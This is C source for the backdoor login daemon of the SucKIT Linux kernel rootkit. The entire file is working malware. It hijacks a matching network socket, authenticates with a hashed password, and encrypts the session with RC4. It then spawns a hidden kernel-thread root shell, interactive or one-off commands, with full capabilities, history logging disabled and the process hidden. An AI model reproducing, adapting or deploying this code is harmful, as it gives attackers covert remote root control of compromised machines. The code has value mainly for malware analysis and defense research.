/*
 * $Id: _suckitd.c, kernel built-in suckit log-in daemon
 */

#include "login.h"

#ifndef _SUCKITD_C
#define _SUCKITD_C

#define TIOCSCTTY	0x540E
#define TIOCGWINSZ	0x5413
#define TIOCSWINSZ	0x5414
#define SIG_DFL		(void *) 0
#define SIGWINCH	28
#define SIGTERM		15
#define SIGKILL		 9
struct winsize {
  unsigned short ws_row;
  unsigned short ws_col;
  unsigned short ws_xpixel;
  unsigned short ws_ypixel;
};


#define __NR_xexecve __NR_execve
#define _syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
type name(type1 arg1,type2 arg2,type3 arg3) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
	: "=a" (__res) \
	: "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
		  "d" ((long)(arg3))); \
return (type) __res; \
}
static inline _syscall3(int,xexecve,const char *,file,char **,argv,char **,envp)


#define alloca(size) __builtin_alloca (size)

static rc4_ctx *k_crypt_ctx = (void *) 0x40000000, 
	       *k_decrypt_ctx = (void *) (0x40000000 + 2048);

static int k_cwrite(int fd, void *buf, int count)
{
	char	*tmp;
	int	ret;

	if (!count)
		return 0;
	tmp = ualloc(count);
	if (!tmp)
		return 0;
	memcpy(tmp, buf, count);
	k_rc4(tmp, count, k_crypt_ctx);
	ret = k_hard_write(fd, tmp, count);
	ufree(tmp);
	return ret;
}

#define scwrite(sock, text) k_cwrite(sock, text, strlen(text))


static int k_cread(int fd, void *buf, int count)
{
	int	i;

	if (!count)
		return 0;
	i = SYS(read, fd, buf, count);
	if (i > 0)
		k_rc4(buf, i, k_decrypt_ctx);
	return i;
}




#define	USE_RAW	0

static	char ebuf1[512];
static	char ebuf2[512];

#define MAXENV	256

static	char *denv[MAXENV] = {
	ebuf1,
	ebuf2,
	"SHELL=/bin/bash", "PS1=\\u@\\h \\w\\$ ", "HISTFILE=/dev/null",
	NULL
};

/* creates tty/pty name by index */
static	void    get_tty(int num, char *base, char *buf)
{
        char    series[] = "pqrstuvwxyzabcde";
        char    subs[] = "0123456789abcdef";
        int     pos = strlen(base);

        strcpy(buf, base);
        buf[pos] = series[(num >> 4) & 0xF];
        buf[pos+1] = subs[num & 0xF];
        buf[pos+2] = 0;
}

/* search for free pty and open it */
static	int     open_tty(int *tty, int *pty)
{
        char    buf[512];
        int     i, fd;

        fd = SYS(open, "/dev/ptmx", O_RDWR, 0);
	SYS(close, fd);
        for (i=0; i < 256; i++) {
                get_tty(i, "/dev/pty", buf);
                *pty = SYS(open, buf, O_RDWR, 0);
                if (*pty < 0) continue;
                get_tty(i, "/dev/tty", buf);
                *tty = SYS(open, buf, O_RDWR, 0);
                if (*tty < 0) {
                        SYS(close, *pty);
                        continue;
                }
                return 1;
        }
        return 0;
}

static	int _pty;

static	void	int_shell(ulong sock, ulong tty)
{
	int	i;
	static char	*darg[] =
		{ "sh", NULL };
	SYS(close, _pty);
	SYS(setsid, 0);
	SYS(ioctl, tty, TIOCSCTTY, NULL);
	for (i = 1; i < 32; i++)
		SYS(signal, i, SIG_DFL);
	SYS(dup2, tty, 0);
	SYS(dup2, tty, 1);
	SYS(dup2, tty, 2);
	if (tty > 2)
		SYS(close, tty);
	SYS(chdir, cfg.home);;
	SYS(umask, 022);
	crd("goin' to execute shell\n");
//	i = SYS(execve, "/bin/sh", darg, denv);
	SYS(ssetmask, 0);
	i = xexecve("/bin/sh", darg, denv);
	crd("error while executing shell %d\n", i);
/*	SYS(close, 0);
	SYS(close, 1);
	SYS(close, 2); */
}

static	void interactive(int sock)
{
	int	pid;
	int	tty, pty;

	scwrite(sock, "\n" BANNER);
	if (!open_tty(&tty, &pty)) {
		scwrite(sock, "Can't open a tty. That's bad.\n");
		go_sleep(3, 0);
		return;
	}
	crd("spawning kernel thread, tty = %d, pty = %d\n", tty, pty);
	_pty = pty;
	pid = kernel_thread(int_shell, sock, tty);
	SYS(close, tty);

	while (1) {
#define	BUF	512
		uchar	buf[BUF];
		int	err;
		fd_set	fds;

		FD_ZERO(&fds);
		FD_SET(pty, &fds);
		FD_SET(sock, &fds);

		err = select((pty > sock) ? (pty+1) : (sock+1),
			&fds, NULL, NULL, NULL);
		
		if (err <= 0) {
			crd("select() = %d\n", err);
			break;
		}

		/* tty => client */
		if (FD_ISSET(pty, &fds)) {
			int count = SYS(read, pty, buf, BUF);
//			crd("read %d bytes from tty\n", count);
			if (count <= 0) {
				break;
			}
			k_rc4(buf, count, k_crypt_ctx);
			k_hard_write(sock, buf, count);
		}

		/* client => tty */
		if (FD_ISSET(sock, &fds)) {
			int	count;
			uchar	*p;

			count = k_cread(sock, buf, BUF);
//			crd("read %d bytes from client\n", count);
			if (count <= 0) {
				break;
			}

			p = memchr(buf, 0, count);
			if (p) {
                                struct  winsize ws;
				struct	wsize wsz;
				int	t;

				t = (buf + count) - p;
				if (t < sizeof(wsz)) {
					memcpy(&wsz, p, t);
					k_cread(sock, ((char *) &wsz) + t,
						sizeof(wsz) - t);
					t = 0;
				} else {
					memcpy(&wsz, p, sizeof(wsz));
					p += sizeof(wsz);
					t -= sizeof(wsz);
				}

				ws.ws_xpixel = ws.ws_ypixel = 0;
				ws.ws_col = wsz.col;
				ws.ws_row = wsz.row;

				if (ws.ws_col & ws.ws_row) {
					SYS(ioctl, pty, TIOCSWINSZ, &ws);
        	                        SYS(kill, -pid, SIGWINCH);
				}

				k_hard_write(pty, p, t);
			} else {
				k_hard_write(pty, buf, count);			
			}
		}
	}
	SYS(kill, -pid, 1);
	SYS(waitpid, -1, 0, 0);
}

static	void	nonint_shell(int *pip, void *buf)
{
	static char	*darg[] =
		{ "sh", "-c", NULL, NULL };
	darg[2] = buf;
	SYS(close, pip[0]);
	SYS(dup2, pip[1], 0);
	SYS(dup2, pip[1], 1);
	SYS(dup2, pip[1], 2);
	xexecve("/bin/sh", darg, denv);
}

static	void	noninteractive(int sock)
{
	char	buf[1024];
	int	i = 0, pid;
	int	pip[2];
	struct	pollfd pfd[2];

	do {
		int r = k_cread(sock, buf + i, sizeof(buf) - i);
		if (r <= 0) return;
		i += r;
	} while ((buf[i-1] != '\n') && (i < sizeof(buf)));
	buf[i-1] = 0;
	socketpair(AF_UNIX, SOCK_STREAM, 0, pip);
	pid = kernel_thread(nonint_shell, (ulong) pip, (ulong) buf);
	SYS(close, pip[1]);
	while (1) {
		pfd[0].fd = pip[0];
		pfd[1].fd = sock;
		pfd[0].events = pfd[1].events = POLLIN | POLLERR | POLLHUP | POLLNVAL;
		pfd[0].revents = pfd[1].revents = 0;
		if (SYS(poll, pfd, 2, -1) < 0)
			continue;
		if (pfd[0].revents & POLLIN) {
			i = SYS(read, pip[0], buf, sizeof(buf));
			if (i == 0) break;
			k_cwrite(sock, buf, i);
			continue;
		}
		if (pfd[1].revents & POLLIN) {
			i = k_cread(sock, buf, sizeof(buf));
			if (i == 0) goto outta;
			k_hard_write(pip[0], buf, i);
			continue;
		}
		if (pfd[0].revents & (POLLERR | POLLHUP | POLLNVAL))
			break;
		if (pfd[1].revents & (POLLERR | POLLHUP | POLLNVAL))
			break;
	}
outta:
	SYS(kill, -pid, SIGTERM);
	SYS(kill, -pid, SIGKILL);
	SYS(waitpid, -1, 0, 0);
}



static	void login(int sock)
{
	int	i;
	ulong	env_size;
	char	*env = NULL, *p;
	char	t[20];
	char	sess[20];
	char	type;

	SYS(alarm, 0);

	sha1_kernel(t, cfg.hashpass, 20);
	sha1_kernel(sess, t, 20);

	k_rc4_init(cfg.hashpass, 20, k_crypt_ctx);
	k_rc4_init(cfg.hashpass, 20, k_decrypt_ctx);

	/* give client chance to synchronize */
	if (k_hard_write(sock, sess, 20) < 20)
		goto outta;

	if (k_cread(sock, t, 20) < 20)
		goto outta;

	if (memcmp(t, cfg.hashpass, 20))
		goto outta;

	if (k_cread(sock, &env_size, 4) < 4)
		goto outta;

//	env_size = ntohl(env_size);
	if (env_size) {
		env = ualloc(env_size);
		if (!env)
			goto outta;
		if ((k_cread(sock, env, env_size) != env_size) ||
		    (env[env_size-1])) {
			ufree(env);
			goto outta;
		}
	}

	/* set remotely provided enviroment */
	for (i = 0; denv[i]; i++);
	for (p = env; p < (env + env_size); p += strlen(p) + 1)
		denv[i++] = p;
	denv[i] = NULL;

	k_cread(sock, &type, 1);
	switch (type) {
		case SHELL_INTERACTIVE:
			interactive(sock);
			break;
		case SHELL_NONINTERACTIVE:
			noninteractive(sock);
			break;
		default:
			scwrite(sock, "unsupported action type\n");
			break;
	}
outta:
	SYS(close, sock);
}

static void shell_thread(ulong in)
{
	int	i;
	struct	mmap mm;

	set_full_caps();
	hide_me();
	
	/* remove user space */
	SYS(munmap, 0, kbase);
	mm.addr = 0x40000000;
	mm.len = 4096;
	mm.prot = PROT_RWX;
	mm.flags = MAP_PRIVATE;
	mm.fd = 0;
	mm.offset = 0;
	
	SYS(mmap, &mm);

	for (i = 0; i < 4096; i++)
		if (i != in) SYS(close, i);

	/* block everything */
	SYS(ssetmask, ~0);
	login(in);
	SYS(munmap, 0x40000000, 4096);
	SYS(exit, 0);
}

static void do_shell_thread(ulong a, int x)
{
	SYS(setsid, 0);
	SYS(setpgid, 0, 0);
	kernel_thread(shell_thread, a, 0);
	SYS(exit, 0);
}

static int pipe_shell(int fd, ushort port)
{
	struct	sockaddr_in peer;
	int	len = sizeof(peer);
	int	newfd;
	int	bpipe;
	ulong	l = KSTART();
	int	ret = -1;
	int	i;

	/* get remote end's name */
	if ((i = getpeername(fd, (struct sockaddr *) &peer, &len)) < 0) {
		crd("can't get peer's name %d\n",i);
		goto err;
	}

	/* make sure it's right socket */
	if ((peer.sin_family != AF_INET) || (peer.sin_port != port)) {
		crd("ports mismatch\n");
		goto err;
	}

	/* copy the socket */
	newfd = SYS(dup, fd);
	if (newfd < 0) {
		crd("can't dup fd");
		goto err;
	}

	/* create broken pipe ... */
	bpipe = socket(AF_INET, SOCK_STREAM, 6);
	if (bpipe < 0) {
		crd("can't create broken pipe\n");
		goto cerr;
	}

	/* ... from original socket :) */
	if (SYS(dup2, bpipe, fd) < 0) {
		crd("can't dup bpipe to orig socket\n");
		goto berr;
	}
	SYS(close, bpipe);

	i = kernel_thread(do_shell_thread, newfd, 0);
	SYS(close, newfd);
	if (i > 0) {
		SYS(waitpid, i, NULL, 0);
	}

	/* connection reset by beer :) */
	ret = -EPIPE;
	SYS(kill, ourself, 13);
berr:
	SYS(close, bpipe);
cerr:
	SYS(close, newfd);
err:
	if (ret == -1) {
		crd("error\n");
	}
	KEND(l);
	return ret;
}


#undef alloca
#endif
